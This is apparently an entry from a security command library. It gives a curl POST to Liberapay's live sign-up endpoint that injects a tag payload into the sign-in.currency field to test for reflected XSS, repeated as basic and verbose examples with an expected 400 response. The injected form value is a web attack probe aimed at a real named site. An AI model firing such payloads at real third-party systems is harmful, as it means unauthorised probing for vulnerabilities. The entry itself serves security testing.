---
data: >-
  curl -X POST "https://liberapay.com/sign-up" -d
  "csrf_token=oiCrDqa91GRS4YBFb4jzZQzpgxSZN38I" -d "form.repost=false" -d
  "sign-in.back-to=/about/me/edit" -d "sign-in.currency=USD<WDILR9>G8OAI[ !+!
  ]</WDILR9>" -d "sign-in.email=sample%40email.tst"
tags:
  - web
  - xss
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:30.897Z'
id: 7d54fc07-3717-4715-90cd-66e330a52e92
verified: false
validated: true
submitted: true
---
# curl-post-payload

## Command

```bash
curl -X POST "https://liberapay.com/sign-up" -d "csrf_token=oiCrDqa91GRS4YBFb4jzZQzpgxSZN38I" -d "form.repost=false" -d "sign-in.back-to=/about/me/edit" -d "sign-in.currency=USD<WDILR9>G8OAI[ !+! ]</WDILR9>" -d "sign-in.email=sample%40email.tst"
```

## Description

This command submits a POST request to the Liberapay sign-up endpoint with form data including a malicious payload in sign-in.currency, testing for reflected XSS via content-sniffing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Adds form data fields | Yes (multiple) |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://liberapay.com/sign-up" -d "csrf_token=oiCrDqa91GRS4YBFb4jzZQzpgxSZN38I" -d "form.repost=false" -d "sign-in.back-to=/about/me/edit" -d "sign-in.currency=USD<WDILR9>G8OAI[ !+! ]</WDILR9>" -d "sign-in.email=sample%40email.tst"
```

### Advanced Usage

```bash
curl -v -X POST "https://liberapay.com/sign-up" -d "csrf_token=oiCrDqa91GRS4YBFb4jzZQzpgxSZN38I" -d "form.repost=false" -d "sign-in.back-to=/about/me/edit" -d "sign-in.currency=USD<WDILR9>G8OAI[ !+! ]</WDILR9>" -d "sign-in.email=sample%40email.tst" -o response.html
```

## Expected Output

HTTP 400 Bad Request response with the payload reflected in the body text, such as in an error message, without script execution due to protections.

## Related

- [[Related Procedure|procedures/Submit-Payload-via-POST-Request]]
